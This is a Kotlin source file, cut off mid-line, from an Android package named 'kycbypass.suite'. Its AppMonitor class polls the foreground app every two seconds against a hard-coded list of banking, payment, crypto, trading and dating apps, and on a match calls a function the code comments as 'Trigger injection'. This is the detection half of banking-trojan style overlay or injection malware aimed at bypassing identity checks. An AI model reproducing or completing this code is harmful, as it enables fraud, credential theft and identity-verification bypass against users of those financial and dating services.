package com.kycbypass.suite.utils

import android.app.ActivityManager
import android.content.Context
import android.os.Handler
import android.os.Looper
import android.util.Log

class AppMonitor(private val context: Context) {
    
    private val handler = Handler(Looper.getMainLooper())
    private var isMonitoring = false
    
    private val targetApps = setOf(
        "com.cashapp.cashapp",
        "com.paypal.android.p2pmobile",
        "com.venmo",
        "com.bankofamerica.bankmobile",
        "com.chase.sig.android",
        "com.wellsfargo.mobile",
        "com.citibank.citibankonline",
        "com.binance.dev",
        "com.coinbase.android",
        "com.revolut.revolut",
        "com.tinder",
        "com.bumble.app",
        "com.hinge.app",
        "com.robinhood.release",
        "com.webull.webull",
        "com.chime.chime"
    )
    
    fun startMonitoring() {
        isMonitoring = true
        monitorLoop()
    }
    
    fun stopMonitoring() {
        isMonitoring = false
        handler.removeCallbacksAndMessages(null)
    }
    
    private fun monitorLoop() {
        if (!isMonitoring) return
        
        val currentApp = getCurrentAppPackage()
        if (currentApp in targetApps) {
            Log.d("AppMonitor", "Target app detected: $currentApp")
            // Trigger injection
            triggerInjection(currentApp)
        }
        
        handler.postDelayed({ monitorLoop() }, 2000)
    }
    
    private fun getCurrentApp